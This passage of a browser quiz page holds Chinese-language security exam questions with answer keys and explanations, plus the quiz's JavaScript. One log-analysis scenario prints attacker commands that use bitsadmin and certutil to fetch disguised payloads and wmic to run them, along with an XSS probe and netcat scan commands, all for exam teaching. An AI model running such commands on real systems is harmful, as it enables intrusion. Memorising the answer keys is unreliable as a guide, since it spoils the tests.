該伺服器已知之漏洞下載資料庫"},"explanation":"Nmap 在資安界人稱「超級雷達掃描器」。主要工作是情報蒐集（偵查階段），就像是安檢員拿著手電筒到大樓外圍，探測這棟樓開了哪些窗口（Port）、裡面住著什麼作業系統（OS 偵測）。至於提權（B ）、偷檔案（C）、搬資料庫（D ），那些都是後續要靠其他「漏洞攻擊工具 （Exploit Tool）」去幹的髒活，Nmap 牌雷達本身是不負責直接動手拆開保險箱的。","group_context":null},{"id":"資安題庫B.pdf::65-4-2c015a12352f19bf","bank":"B","pdf":"資安題庫B.pdf","qid":"65-4-2c015a12352f19bf","page":65,"number":4,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於滲透測試(Penetration Test, PT)，下列敘述何者「不」正確？","options":{"A":"模擬駭客攻擊並評估網路、資訊系統安全性之活動，於產出報告中詳述弱點如何利用與影響，並給予修復建議","B":"滲透測試可分非破壞測試(Nondestructive Test)，與破壞測試 (Destructive Test)","C":"滲透測試有五種類別：黑箱(Black- box)、白箱(White-box)、灰箱(Grey - box)、紅箱(Red- box)，與藍箱(Blue-box)，差異為提供測試人員受測目標資訊之詳細程度","D":"弱點掃描與滲透測試差異在於，前者僅關注於找到已知弱點，後者則引入縱深防禦的概念於發現組織之安全問題"},"explanation":"資安界根據測試人員「對受測目標的了解程度」，將測試分為：完全不知道內部構造的「黑箱」（盲打模擬外網駭客）、什麼都知道的「白箱」（拿到程式碼或架構圖）、以及知道一半的 「灰箱」。(C) 沒有「紅箱」、「藍箱」。","group_context":null},{"id":"資安題庫B.pdf::66-1-a4b7ace40ec5375c","bank":"B","pdf":"資安題庫B.pdf","qid":"66-1-a4b7ace40ec5375c","page":66,"number":1,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於 PTES(Penetration Testing ExecutionStandard)流程項目的排序，下列何者正確？","options":{"A":"漏洞分析 \u003e 威脅建模 \u003e 情報收集 \u003e 報告","B":"情報收集 \u003e 漏洞分析 \u003e 威脅建模 \u003e 報告","C":"前期溝通 \u003e 情報收集 \u003e 漏洞分析 \u003e 報告","D":"威脅建模 \u003e 前期溝通 \u003e 情報收集 \u003e 漏洞分析"},"explanation":"國際標準的滲透測試（ PTES）有一套嚴格的先後順序，這就像特工執行任務： 1. 前期溝通 (Pre- engagement)：先跟客戶談好合約、拿授權書， 確定什麼能打、什麼不能打。 2. 情報收集 (Intelligence Gathering)：小偷踩點、摸清地形。 3. 威脅建模 (Threat Modeling)：在腦海中計畫「這個目標適合用哪種進攻劇本」。 4. 漏洞分析 (Vulnerability Analysis)：找出對方的破綻。 5. 漏洞利用 (Exploitation)：正式破窗而入。 6. 後滲透階段 (Post- Exploitation)：進去後搜刮金庫、安插後門。 7. 報告 (Reporting)：把過程寫成報告。 只有 (C)的「前期溝通 \u003e 情報收集 \u003e 漏洞分析 \u003e 報告」順序完全符合這個邏輯。","group_context":null},{"id":"資安題庫B.pdf::69-2-606feba53badb4dc","bank":"B","pdf":"資安題庫B.pdf","qid":"69-2-606feba53badb4dc","page":69,"number":2,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"下列何者屬於密碼潑灑（Password Spraying）攻擊？","options":{"A":"蒐集常用的密碼放入字典，嘗試登入系統","B":"用單一弱密碼，嘗試登入系統","C":"使用已外洩的帳號與密碼的各種組合，嘗試登入系統","D":"使用可能各種密碼組合，嘗試登入系統"},"explanation":"密碼潑灑（Password Spraying）是一種防鎖定的聰明戰術。如果抓著同一個員工帳號連續猜 100 個密碼，系統一定會警報並鎖死帳號。所以噴灑手法是：「小偷拿著同一個全宇宙最常見的超級弱密碼（如 123456 或 Password），對著全公司 2000 個員工的帳號每人只猜一次」（B 正確）。這樣既不會觸發單一帳號鎖定，又能大機率釣到某個把密碼設得很爛的菜鳥。","group_context":null},{"id":"資安題庫B.pdf::73-2-baca6d581971ee35","bank":"B","pdf":"資安題庫B.pdf","qid":"73-2-baca6d581971ee35","page":73,"number":2,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於兩個指令的執行結果，何者正確？ nc -vzw5 192.168.0.1 1- 2048 (操控端) nc -v -z -w5 192.168.0.1 1- 2048 (操控端)","options":{"A":"結果相同，對 192.168.0.1 主機進行 vpn 連線，且連線時間設定 2048 秒","B":"結果不同，對 192.168.0.1 主機進行監聽，且監聽時間設定 2048 秒","C":"結果相同，對 192.168.0.1 主機之 TCPport1 -2048 進行掃描，且連線逾時設定 5 秒","D":"結果不同，對 192.168.0.1 主機之 UCPport1 -2048 進行掃描，且連線逾時設定 5 秒"},"explanation":"這兩個指令只是把參數縮寫（- vzw5）和拆開寫（ -v -z -w5）的差別，效果完全一樣。其中 -z 代表「零輸入輸出模式（只偵測不傳資料）」，- v 代表「詳細回報」，-w5 代表「等 5 秒沒回應就放棄 （Timeout）」。後面接 1-2048 代表連續敲大樓的 1 到 2048 號房間門 （Port 掃描）。所以這就像是小張挨家挨戶去敲門，每間房最多等 5 秒， 只為了看裡面有沒有人應門（ C 正確）。","group_context":null},{"id":"資安題庫B.pdf::73-4-aae430f0e715d36d","bank":"B","pdf":"資安題庫B.pdf","qid":"73-4-aae430f0e715d36d","page":73,"number":4,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"題組背景描述如附圖。請問操控端下達何種指令時，等待接聽 TCP 80 port，若接收到連線，就可以將 test.txt 傳送給對方？","options":{"A":"nc -l -p 80 \u003c type test.txt（操控端）","B":"nc -t -p 80 \u003c type test.txt（操控端）","C":"nc -g -p 80 \u003e type test.txt（操控端）","D":"nc -g -p 80 \u003c type test.txt（操控端）"},"explanation":"這題考的是「箭頭方向（資料流向）」。小張要負責「開門監聽（- l）」並且把「檔案餵出去給別人」。在命令列裡，\u003c 就像是漏斗，把後面的檔案內容（test.txt ）灌進去給 netcat 這個大喇叭。當外面有人連進 80 埠時，這個大喇叭就會自動把灌進去的檔案順著網路線噴給對方。","group_context":null},{"id":"資安題庫B.pdf::74-1-b2106dede552a0ac","bank":"B","pdf":"資安題庫B.pdf","qid":"74-1-b2106dede552a0ac","page":74,"number":1,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"關於網路資源的敘述，下列何者錯誤？","options":{"A":"FOFA 是覆蓋全球資料頗為完整的 IT 設備搜尋引擎，非中國創立資料庫","B":"Shodan 是世界上第一個用於聯網與 IoT 設備的搜尋引擎，可以查找到電子門鎖相關資訊","C":"ZoomEye 是由中國創宇 404 實驗室所搭建網路空間搜尋引擎","D":"Censys 也是蒐集全球最新的 Internet 掃描數據源"},"explanation":"這裡提到的工具都是資安界的「全球聯網設備特搜雷達」。其中 FOFA 偏偏就是由中國白帽團隊（華順信安）所一手創立的知名搜尋引擎。 (A)卻硬說它「非中國創立」，直接記錯了身世，所以是錯的。","group_context":null},{"id":"資安題庫B.pdf::78-2-e96f9699d15e6533","bank":"B","pdf":"資安題庫B.pdf","qid":"78-2-e96f9699d15e6533","page":78,"number":2,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"請問附圖小明下了什麼指令？","options":{"A":"udp.port == 53","B":"tcp.port eq 80","C":"ip.addr == 192.168.23.9","D":"arp eq DNS"},"explanation":"觀察圖中的「 Protocol」那一欄，清一色都是 DNS（網域名稱系統）且 Info 欄位顯示的都是 Standard query（標準查詢）與 Standard query response（標準回應）。 • DNS 服務預設主要是透過 UDP 的 Port 53 進行傳輸。因此在 Wireshark 中輸入過濾指令 udp.port == 53，意思就是告訴系統：「大廳人太多了， 把所有無關的人隱藏，只把在 53 號櫃檯（DNS）辦理業務的對話留給我看！」 • (B)tcp.port eq 80：這是用來篩選 HTTP（網頁）流量的指令，與圖中的 DNS 無關。 • (C)ip.addr == 192.168.23.9：圖中的 IP 位址只有 192.168.23.129 與 192.168.23.2，並沒有出現 .9 的 IP。 • (D)arp eq DNS：語法錯誤。 ARP 與 DNS 是不同的網路協定，不能這樣組合過濾。","group_context":null},{"id":"資安題庫B.pdf::79-4-4de1a6d05400a8af","bank":"B","pdf":"資安題庫B.pdf","qid":"79-4-4de1a6d05400a8af","page":79,"number":4,"multiple":false,"answers":["A"],"chosen_last":["B"],"stem":"小明在附圖封包中可以判斷出受害者連線下載惡意程式的網站 IP 位置為下列何者？","options":{"A":"59.53.91.102","B":"192.168.23.129","C":"65.55.195.250","D":"127.0.0.1"},"explanation":"確認受害者 IP 位址：從封包記錄中可以看到，內部私有網段的 IP 192.168.23.129 不斷向外連線，並發出 GET /true.php 以及隨後的 GET /xxx.xxx 請求，可以確定受害者機器的 IP 為 192.168.23.129（排除 B）。 • 分析惡意連線與下載行為：受害者（192.168.23.129 ）向外部 IP 59.53.91.102 的 Port 80 發出網頁請求（HTTP GET）。隨後，該網站回應了 HTTP/1.1 200 OK 並緊接著觸發了對 xxx.xxx（通常為惡意程式副檔名或可執行檔的代稱）的下載請求。另一個外部 IP 65.55.195.250，受害者雖然有與其進行 TCP 三向交握（Port 443 ），但圖中並未出現明確的惡意網頁請求或下載內容。","group_context":null},{"id":"資安題庫B.pdf::83-3-f4552dd70712cd44","bank":"B","pdf":"資安題庫B.pdf","qid":"83-3-f4552dd70712cd44","page":83,"number":3,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"上述情境中，關於 IIS Access log，下列敘述何者「不」 正確？","options":{"A":"10.10.10.100，在 IIS Log format 預設順序指的是 Client IP","B":"110.10.1.103，在 IIS Log format 預設順序指的是 Client IP","C":"交叉分析後這是一個內部人員竊取 CRM 資料庫惡意行為","D":"1ogin.asp 是無法被下載儲存"},"explanation":"2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 -10.10.10.100 日誌最前排的 110.10.1.103 是從外面連進來的訪客（Client IP， B 正確），而 10.10.10.100 是公司網站自家大門 IP（Server IP）(A 選項錯誤)。 • (C)結合項目(4)發現「研發人員端點電腦（內網）」有使用 bitsadmin 與 certutil 下載惡意程式並執行的完整紀錄，且項目(1)最終出現了來自內部網段 IP（10.10.10.100）的讀取軌跡。這代表這場攻擊伴隨著內網跳板或內部人員（被控端點）配合執行的惡意行為，用以打包並竊取 CRM 資料庫。 • (D 選項錯誤)如項目(2)所述，駭客已經把 CRM 資料庫備份成一個實體檔案並命名為 1ogin.asp 放進網頁根目錄。因為它在本質上是一個「偽裝成網頁副檔名的資料庫二進位檔案」，且項目 (1) 的回應狀態碼為 200（成功），這代表該檔案完全可以、而且已經被成功下載並儲存到攻擊者的設備。","group_context":"某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3) 資訊系統存取紀錄以及(4) 研發人員端點電腦紀錄，請就下列紀錄與報告內容關聯性，回答相關問題： (1)在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分類下的藍燈報告中發現： 2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58 (2)在資料庫交易記錄中發現： 05/12/2019 10:51:18,Backup,未知,Database backed up. Database: CRM\u003cc/\u003e creation date(time): 2019/05/12(10:42:26)\u003cc/\u003e pages dumped: 354\u003cc/\u003e first LSN: 34:83:74\u003cc/\u003e last LSN: 34:114:1\u003cc/\u003e number of dump devices: 1\u003cc/\u003e device information: (FILE=1\u003cc/\u003e TYPE=DISK: {'D:\\IIS\\ wwwroot\\ 1ogin.asp'}). This is an informational message only. No user action is required. (3)在 IIS Access Log 發現： Request Post ... Cookie:... User-Agent:... _action_save=Save\u0026_roleCheck=\u0026confirmPwd=CrmAdmPa$$Wd\u0026email=cr madmin@stalker.com\u0026name=follmy\u0026roleCheck=4000le72f9034d0032xdbb | 2019\u0026telNo=0988xxxxx\u0026DeptNo=%27%22%28%28%28%26%251%3cScRiPt%20 %3eprompt%28971921%29%3c%2fScRiPt%3e\u0026UserAcoount=CrmAdmin\u0026 UserPwd= CrmAdmPa$$Wd Response HTTP/1.1 200 OK (4)在研發人員端點電腦記錄發現： Input_1\u003eStart bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\ windows\\system32\\ inject.dll ... Input_10\u003e certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11\u003e copy conceal2.jpg c:\\ windows\\ system32\\hacking.exe Input_12\u003e wmic process call create C:\\ Windows\\System32\\ hacking.exe"},{"id":"資安題庫B.pdf::83-4-637798394e6bd646","bank":"B","pdf":"資安題庫B.pdf","qid":"83-4-637798394e6bd646","page":83,"number":4,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"上述情境中，關於研發人員端點電腦記錄，下列敘述何者 「不」正確？","options":{"A":"該員工利用 bitsadmin 下載一張圖片，下載效率很高","B":"Certutil.exe 可用來傾印顯示憑證單位(CA)資訊，還原 CA 元件、金鑰組和憑證鏈結","C":"該員工利用 wmic 來叫用 windowsS ystem32 下 hacking.exe","D":"透過電腦紀錄發現，本狀況可能為員工個人操作行為所造成"},"explanation":"看看這個研發人員電腦的紀錄：先用 bitsadmin 偷偷抓個假裝成圖片的病毒（A 正確），再用 certutil 抓第二個駭客程式（B 正確），最後動用 wmic 命令直接把 hacking.exe 在後台開機執行（C 正確）。(D) 居然安慰自己說「這可能只是員工個人的正常操作行為」。這就像是看到一個老實的研發同仁突然蒙面、帶開鎖工具、在天花板爬行，你還說他只是在做日常研發一樣。這百分之百是電腦已經被駭客奪取控制權（C\u0026C ）的被駭慘狀！","group_context":"某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3) 資訊系統存取紀錄以及(4) 研發人員端點電腦紀錄，請就下列紀錄與報告內容關聯性，回答相關問題： (1)在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分類下的藍燈報告中發現： 2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58 (2)在資料庫交易記錄中發現： 05/12/2019 10:51:18,Backup,未知,Database backed up. Database: CRM\u003cc/\u003e creation date(time): 2019/05/12(10:42:26)\u003cc/\u003e pages dumped: 354\u003cc/\u003e first LSN: 34:83:74\u003cc/\u003e last LSN: 34:114:1\u003cc/\u003e number of dump devices: 1\u003cc/\u003e device information: (FILE=1\u003cc/\u003e TYPE=DISK: {'D:\\IIS\\ wwwroot\\ 1ogin.asp'}). This is an informational message only. No user action is required. (3)在 IIS Access Log 發現： Request Post ... Cookie:... User-Agent:... _action_save=Save\u0026_roleCheck=\u0026confirmPwd=CrmAdmPa$$Wd\u0026email=cr madmin@stalker.com\u0026name=follmy\u0026roleCheck=4000le72f9034d0032xdbb | 2019\u0026telNo=0988xxxxx\u0026DeptNo=%27%22%28%28%28%26%251%3cScRiPt%20 %3eprompt%28971921%29%3c%2fScRiPt%3e\u0026UserAcoount=CrmAdmin\u0026 UserPwd= CrmAdmPa$$Wd Response HTTP/1.1 200 OK (4)在研發人員端點電腦記錄發現： Input_1\u003eStart bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\ windows\\system32\\ inject.dll ... Input_10\u003e certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11\u003e copy conceal2.jpg c:\\ windows\\ system32\\hacking.exe Input_12\u003e wmic process call create C:\\ Windows\\System32\\ hacking.exe"},{"id":"資安題庫C.pdf::6-1-653253b4fb6d8bfd","bank":"C","pdf":"資安題庫C.pdf","qid":"6-1-653253b4fb6d8bfd","page":6,"number":1,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"為了有效防範 AI 深度偽造技術的語音與影像攻擊，降低組織同仁受騙將公司的款項匯出造成組織的營運損失，下列何項推動組合較為有效？","options":{"A":"(2)(5)","B":"(1)(3)","C":"(6)(7)","D":"(4)(5)"},"explanation":"預防 Deep fake 欺騙「同仁認知」的直接手段中，一方面在公司網路把那些做假臉假聲音的工具網站封鎖（(1) 源頭阻擋工具），另一方面教員工怎麼看破假影片的破綻（ (3)提升人員教育，例如看脖子紅腫、眼睛不自然、請對方在鏡頭前揮揮手）是最直接針對該攻擊手法的組合。","group_context":"近年來，人工智慧的應用有效的協助企業組織完成許多艱難的任務，節省大量的人力。然而，結合深度偽造技術（Deepfake）的語音與影像攻擊，使詐騙效果更高。攻擊者可精準模仿組織高層的聲音或影像，誘使受害者放下警覺、 依指示行動，導致重大資安風險與營運損失。企業高層要求身為資安長的您規劃一系列的強化機制，以避免組織同仁受騙將公司的款項匯出造成組織的營運損失。 資安部門據此推動以下控制措施： (1) 阻擋存取深度偽造工具或相關不良內容網站的使用。 (2) 企業導入影像辨識、聲音辨識或 AI 模組，增加深度偽造攻擊的防禦能力。 (3) 教育員工辨識深度偽造攻擊（如假冒上司語音指令、影像假訊息等）。 (4) 財務與會計系統導入多因子認證（Multi-Factor Authentication, MFA）， 以降低匯款人員身份遭到盜用。 (5) 電子郵件系統強化安全性，導入電子郵件系統的資料儲存加密技術。 (6) 加強職務區隔（Segregation of Duties, SoD）：超過一定金額的匯款額度需要經過主管複核同意後始得匯款。 (7) 採用專有視訊會議系統導入多因子認證，封鎖非公司認可的專有視訊會議系統開會。"},{"id":"資安題庫C.pdf::8-3-9b896213113360f5","bank":"C","pdf":"資安題庫C.pdf","qid":"8-3-9b896213113360f5","page":8,"number":3,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"針對此類利用 AI 技術的新興威脅，資安團隊在進行年度風險評鑑時，應如何調整其風險機率（Likelihood）的評估準則較為適切？","options":{"A":"因 AI 技術門檻高，應調降此類攻擊發生的機率","B":"維持既有評估，認為 Deep fake 僅會發生在國家級攻擊","C":"應調升機率，因 GenAI 工具普及降低了攻擊成本與技術門檻","D":"無法評估，將其列為不可抗力的例外風險"},"explanation":"題庫未提供解析","group_context":"一家跨國製造業的財務長接到一通來自「集團執行長」的視訊電話，要求立即匯款一筆巨額資金至海外帳戶以進行秘密併購。視訊中執行長的影像與聲音均無異狀。然而，這實際上是攻擊者利用 AIDeep fake 技術生成的詐騙。所幸財務長在最後一刻依循公司規定的「例外匯款雙重確認流程」，透過內部加密通訊軟體向執行長文字確認，才揭穿騙局。"},{"id":"資安題庫C.pdf::9-1-a5d58505cbeb9408","bank":"C","pdf":"資安題庫C.pdf","qid":"9-1-a5d58505cbeb9408","page":9,"number":1,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"附圖為智慧製造企業組織的網路架構圖，請問下列描述何者較「不」 正確？ 網際網路 ⭢網路防火牆 A⭢網站服務伺服器⭢ 網路防火牆 B ⭢網路防火牆 C ⭢ERP 伺服器、辦公電腦⭢網路防火牆 D⭢OT 資料交換伺服器⭢網路防火牆 E ⭢PLC、HMI、機台設備","options":{"A":"防火牆 A 至防火牆 E 的部署主要為了強化網路的縱深防禦","B":"為特別加強防護，屬於 DMZ 網路的網路(2)及網路(4) ，應特別加強保護","C":"為確保網路安全，可考慮採用實體隔離的技術( 如 Air Gap)隔離 IT 與 OT 網路","D":"因網站服務需開放外部連線，因此需要在網路防火牆 A 設定開放網際網路至網站服務伺服器的 HTTPS 協定"},"explanation":"DMZ（非軍事區 / Demilitarized Zone） 是專門用來放置「需要對外公開提供服務」的伺服器區域（如本題網路(1) 的網站伺服器）。網路 (2)是內部的辦公電腦與 ERP，網路(4) 則是機密且敏感的工廠控制台 （PLC、HMI ）。如果把這兩個極度需要保護的內部區域當作「對外公開的 DMZ」，等於是把家裡的保險箱直接搬到馬路旁邊，完全不符合安全邏輯。","group_context":null},{"id":"資安題庫C.pdf::9-2-6f84401ce5e0e71e","bank":"C","pdf":"資安題庫C.pdf","qid":"9-2-6f84401ce5e0e71e","page":9,"number":2,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"某智慧製造工廠計畫導入零信任安全架構( Zero Trust Architecture, ZTA)以保護其營運技術 (Operational Technology, OT)網路。相較於傳統的資訊技術(Information Technology, IT)環境，在 OT 場域中實施 ZTA 時，面臨的最大挑戰通常是什麼？","options":{"A":"使用者身分多元，難以統一管理","B":"缺乏足夠的網路頻寬來處理持續的驗證請求","C":"大量老舊的工業控制系統(ICS)與設備不支援現代化的身分驗證協定","D":"OT 環境中的資料流量過於龐大，難以進行深度封包檢測(Deep Packet Inspection, DPI)"},"explanation":"零信任（ Zero Trust） 的核心是「永不信任，持續驗證」。每次存取都要驗證帳號密碼、憑證或雙重認證（2FA ）。然而，工廠裡的機台（如 PLC）通常都非常「長壽」，很多是用了 15、20 年的老骨董。這些老設備當初設計時，連網路安全的概念都沒有，更不可能支援現代高科技的加密金鑰與身份驗證協定。","group_context":null}]}</script>
<script id="quiz-core">
'use strict';
globalThis.QuizCore = (() => {
  const VERSION = 1;
  function shuffle(items, random = Math.random) {
    const result = [...items];
    for (let i = result.length - 1; i > 0; i--) {
      const j = Math.floor(random() * (i + 1));
      [result[i], result[j]] = [result[j], result[i]];
    }
    return result;
  }
  function create(questions, fingerprint, banks, randomOrder, ids = null, random = Math.random) {
    const allowed = ids === null ? null : new Set(ids);
    let selected = questions.filter(q => banks.includes(q.bank) && (allowed === null || allowed.has(q.id)));
    selected = selected.slice().sort((a,b) => a.bank.localeCompare(b.bank) || a.page - b.page || a.number - b.number);
    let order = selected.map(q => q.id);
    if (randomOrder) order = shuffle(order, random);
    if (!order.length) throw new Error('請至少選擇一個有題目的題庫。');
    return {version: VERSION, fingerprint, order, responses: {}, index: 0, mode: 'quiz', randomOrder};
  }
  function grade(question, choice) { return question.answers[0] === choice; }
  function answer(state, byId, choice) {
    const id = state.order[state.index], question = byId.get(id);
    if (state.mode !== 'quiz' || !question || !Object.hasOwn(question.options, choice) || Object.hasOwn(state.responses,id)) return state;
    return {...state, responses: {...state.responses, [id]: choice}};
  }
  function score(state, byId) {
    const banks = Object.fromEntries(['A','B','C'].map(bank => [bank,{correct:0, wrong:0, total:0}]));
    const wrongIds = [];
    let correct = 0, answered = 0;
    for (const id of state.order) {
      const q = byId.get(id); banks[q.bank].total++;
      if (!Object.hasOwn(state.responses,id)) continue;
      answered++;
      if (grade(q,state.responses[id])) {correct++; banks[q.bank].correct++;}
      else {wrongIds.push(id); banks[q.bank].wrong++;}
    }
    return {correct, answered, total:state.order.length, wrongIds, banks};
  }
  function move(state, delta) {
    return {...state, index:Math.max(0,Math.min(state.order.length-1,state.index+delta)),mode:'quiz'};
  }
  function serialize(state) { return JSON.stringify(state); }
  function restore(raw, questions, fingerprint) {
    try {
      const s = JSON.parse(raw), byId = new Map(questions.map(q => [q.id,q]));
      if (!s || s.version !== VERSION || s.fingerprint !== fingerprint || !Array.isArray(s.order) || !s.order.length || new Set(s.order).size !== s.order.length || s.order.some(id => !byId.has(id))) return null;
      if (!Number.isInteger(s.index) || s.index < 0 || s.index >= s.order.length || !['quiz','results'].includes(s.mode) || typeof s.randomOrder !== 'boolean') return null;
      if (!s.responses || typeof s.responses !== 'object' || Array.isArray(s.responses)) return null;
      if (Object.entries(s.responses).some(([id,choice]) => !s.order.includes(id) || !Object.hasOwn(byId.get(id).options,choice))) return null;
      // A session always answers in sequence, with earlier questions available for review.
      const firstUnanswered = s.order.findIndex(id => !Object.hasOwn(s.responses,id));
      if (firstUnanswered !== -1 && (s.index > firstUnanswered || s.order.slice(firstUnanswered).some(id => Object.hasOwn(s.responses,id)) || s.mode === 'results')) return null;
      return {version:VERSION, fingerprint, order:s.order, responses:s.responses, index:s.index, mode:s.mode, randomOrder:s.randomOrder};
    } catch { return null; }
  }
  return {create, shuffle, grade, answer, score, move, serialize, restore};
})();
</script>
<script id="quiz-app">
'use strict';
(() => {
  const data = JSON.parse(document.getElementById('quiz-data').textContent);
  const questions = data.questions, byId = new Map(questions.map(q => [q.id,q]));
  const core = globalThis.QuizCore, KEY = 'wrong-quiz-infosec-v1';
  const $ = id => document.getElementById(id);
  let state = null, screen = 'home';
  function notice(message) { $('storage-notice').textContent = message; $('storage-notice').hidden = false; }
  function save() {
    try { localStorage.setItem(KEY,core.serialize(state)); }
    catch { notice('目前無法儲存進度。你仍可完成這一輪，但關閉或重新整理後可能需要重做。'); }
  }
  try {
    const raw = localStorage.getItem(KEY);
    if (raw) {
      state = core.restore(raw,questions,data.fingerprint);
      if (!state) notice('舊進度與目前題庫不相容或已損壞，請開始新一輪。');
    }
  } catch { notice('目前無法讀取進度。你仍可作答，但關閉後可能無法繼續上次。'); }
  function show(name, focusId) {
    screen = name;
    for (const id of ['home','quiz','results']) $(id).hidden = id !== name;
    if (focusId) { $(focusId).focus({preventScroll:true}); window.scrollTo(0,0); }
  }
  function source(q) { return `題庫 ${q.bank}・第 ${q.page} 頁・第 ${q.number} 題`; }
  function selectedBanks() { return [...document.querySelectorAll('input[name="bank"]:checked')].map(input => input.value); }
  function updateSelected() {
    const banks = selectedBanks(), count = questions.filter(q => banks.includes(q.bank)).length;
    $('start-selected').textContent = count ? `只做已選題庫（${count} 題）` : '請至少選擇一個題庫';
    $('start-selected').disabled = count === 0;
  }
  function home(focus = true) {
    $('resume-area').hidden = !state;
    if (state) {
      const s = core.score(state,byId);
      $('resume-summary').textContent = state.mode === 'results' ? `上次已完成 ${s.total} 題，可繼續查看結果。` : `上次停在第 ${state.index+1}／${s.total} 題，已作答 ${s.answered} 題。`;
    }
    show('home',focus ? 'home-title' : null);
  }
  function start(banks, ids = null, randomOrder = document.querySelector('input[name="order"]:checked').value === 'random') {
    state = core.create(questions,data.fingerprint,banks,randomOrder,ids);
    save(); renderQuestion();
  }
  function addText(parent, tag, text, className = '') {
    const node = document.createElement(tag); node.textContent = text;
    if (className) node.className = className;
    parent.appendChild(node); return node;
  }
  function renderQuestion(focus = true) {
    const q = byId.get(state.order[state.index]), chosen = state.responses[q.id];
    const answered = Object.hasOwn(state.responses,q.id), s = core.score(state,byId);
    $('progress-text').textContent = `第 ${state.index+1}／${s.total} 題`;
    $('correct-count').textContent = `目前答對 ${s.correct} 題・已作答 ${s.answered} 題`;
    $('progress-bar').max = s.total; $('progress-bar').value = s.answered;
    $('question-source').textContent = source(q);
    $('question-context').hidden = !q.group_context;
    $('context-text').textContent = q.group_context || '';
    $('question-title').textContent = q.stem;
    $('options').replaceChildren();
    for (const [letter,text] of Object.entries(q.options)) {
      const button = document.createElement('button'); button.type = 'button'; button.className = 'option';
      button.dataset.letter = letter;
      addText(button,'span',letter,'letter');
      const copy = addText(button,'span',text,'option-copy');
      if (answered) {
        button.disabled = true;
        if (core.grade(q,letter)) {
          button.classList.add('correct');
          addText(copy,'span',letter === chosen ? '✓ 正確答案・你選的答案' : '✓ 正確答案','badge');
        } else if (letter === chosen) {
          button.classList.add('incorrect'); addText(copy,'span','✕ 你選的答案','badge');
        }
      }
      button.addEventListener('click',() => choose(letter)); $('options').appendChild(button);
    }
    // Remove old answer content entirely before rendering a new unanswered question.
    $('feedback').replaceChildren(); $('feedback').hidden = !answered;
    if (answered) {
      const correct = core.grade(q,chosen);
      addText($('feedback'),'p',correct ? '答對了！' : `這題再記一次，正確答案是 ${q.answers[0]}。`,`outcome ${correct ? 'good':'bad'}`);
      addText($('feedback'),'h3','解析');
      addText($('feedback'),'p',q.explanation || '此題未提供解析。','explanation');
      const last = Array.isArray(q.chosen_last) ? q.chosen_last.join('、') : q.chosen_last;
      addText($('feedback'),'p',`上次你選的是 ${last || '（未記錄）'}`,'muted');
    }
    $('previous').disabled = state.index === 0;
    $('next').hidden = !answered;
    $('next').textContent = state.index === state.order.length - 1 ? '查看結果' : '下一題';
    $('back-results').hidden = s.answered !== s.total;
    show('quiz',focus ? 'question-title' : null);
  }
  function choose(letter) {
    if (screen !== 'quiz') return;
    const next = core.answer(state,byId,letter);
    if (next === state) return;
    state = next; save(); renderQuestion(false); $('next').focus({preventScroll:true});
  }
  function results() {
    const s = core.score(state,byId);
    if (s.answered !== s.total) return;
    state = {...state,mode:'results'}; save();
    $('result-rate').textContent = `${Math.round(100*s.correct/s.total)}%`;
    $('result-summary').textContent = `${s.total} 題中，答對 ${s.correct} 題、答錯 ${s.wrongIds.length} 題。`;
    $('bank-results').replaceChildren();
    for (const [bank,stats] of Object.entries(s.banks)) {
      addText($('bank-results'),'p',`題庫 ${bank}：答對 ${stats.correct}／答錯 ${stats.wrong} 題${stats.total ? '' : '（本輪未作答）'}`,'bank-stat');
    }
    $('retry-wrong').hidden = !s.wrongIds.length;
    $('wrong-hint').textContent = s.wrongIds.length ? '點選題目，回看你的答案與解析。' : '全部答對！這次沒有需要重做的題目。';
    $('wrong-list').replaceChildren();
    for (const id of s.wrongIds) {
      const q = byId.get(id), button = document.createElement('button'); button.className = 'wrong-item';
      addText(button,'span',source(q),'source'); addText(button,'span',q.stem);
      button.addEventListener('click',() => { state = {...state,index:state.order.indexOf(id),mode:'quiz'}; save(); renderQuestion(); });
      $('wrong-list').appendChild(button);
    }
    show('results','results-title');
  }
  $('total-count').textContent = questions.length;
  $('bank-counts').textContent = ['A','B','C'].map(bank => `題庫 ${bank}：${questions.filter(q => q.bank === bank).length} 題`).join('　');
  document.querySelectorAll('input[name="bank"]').forEach(input => input.addEventListener('change',updateSelected));
  $('start-all').addEventListener('click',() => start(['A','B','C']));
  $('start-selected').addEventListener('click',() => start(selectedBanks()));
  $('resume').addEventListener('click',() => { if (state) state.mode === 'results' ? results() : renderQuestion(); });
  $('clear-progress').addEventListener('click',() => {
    if (!window.confirm('清除目前儲存的作答進度？題庫不會被刪除。')) return;
    try { localStorage.removeItem(KEY); state = null; home(); }
    catch { notice('目前無法清除儲存的進度。請允許瀏覽器使用本機儲存後再試。'); }
  });
  $('go-home').addEventListener('click',() => home());
  $('results-home').addEventListener('click',() => home());
  $('previous').addEventListener('click',() => { state = core.move(state,-1); save(); renderQuestion(); });
